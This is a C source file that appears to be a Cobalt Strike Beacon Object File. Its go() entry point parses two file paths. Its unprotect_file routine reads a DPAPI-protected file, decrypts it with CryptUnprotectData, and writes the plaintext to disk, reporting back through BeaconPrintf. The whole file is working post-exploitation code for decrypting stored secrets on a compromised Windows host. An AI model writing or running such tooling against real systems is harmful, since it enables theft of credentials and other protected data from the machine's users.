#include "common/beacon.h"
#include <stdio.h>

void unprotect_file(const char* input_path, const char* out_path)
{
	FILE* enc_file = NULL;
	FILE* out_file = NULL;
	size_t file_size = 0;
	char* buf = NULL;
	DATA_BLOB enc_blob;
	DATA_BLOB dec_blob;

	enc_file = fopen(input_path, "rb");
	if (!enc_file) {
		BeaconPrintf(CALLBACK_ERROR, "failed to open enc file: %lu", GetLastError());
		return;
	}

	fseek(enc_file, 0, SEEK_END);
	file_size = ftell(enc_file);
	fseek(enc_file, 0, SEEK_SET);

	BeaconPrintf(CALLBACK_OUTPUT, "protected file size: %lu", file_size);

	buf = malloc(file_size);
	if (!buf) {
		goto _END;
	}

	BeaconPrintf(CALLBACK_OUTPUT, "%lu bytes read", fread(buf, 1, file_size, enc_file));

	enc_blob.pbData = buf;
	enc_blob.cbData = file_size;
	dec_blob.pbData = NULL;
	dec_blob.cbData = 0;
	if (!CryptUnprotectData(&enc_blob, NULL, NULL, NULL, NULL, 0, &dec_blob)) {
		BeaconPrintf(CALLBACK_ERROR, "failed to unprotect data: %lu", GetLastError());
		goto _END;
	}

	out_file = fopen(out_path, "wb");
	if (out_file) {
		fwrite(dec_blob.pbData, 1, dec_blob.cbData, out_file);
	}
	else {
		BeaconPrintf(CALLBACK_ERROR, "failed to open file to write: %lu", GetLastError());
	}

_END:
	if (enc_file) {
		fclose(enc_file);
	}
	if (out_file) {
		fclose(out_file);
	}
	if (buf) {
		free(buf);
	}
}

void go(char* args, int alen)
{
	const char* enc_file_path = args;
	const char* out_file_path = NULL;

	int quot = 0;
	for (int i = 0; i < alen; ++i) {
		char ch = args[i];
		if (ch == '"') {
			quot = (quot == 0);	// invert
		}
		else if (ch == ' ' && quot == 0) {
			args[i] = 0;
			out_file_path = &args[i + 1];
			break;
		}
	}

	if (!out_file_path) {
		BeaconPrintf(CALLBACK_ERROR, "usage: this.o <enc file> <out file>");
		return;
	}

	unprotect_file(enc_file_path, out_file_path);
}
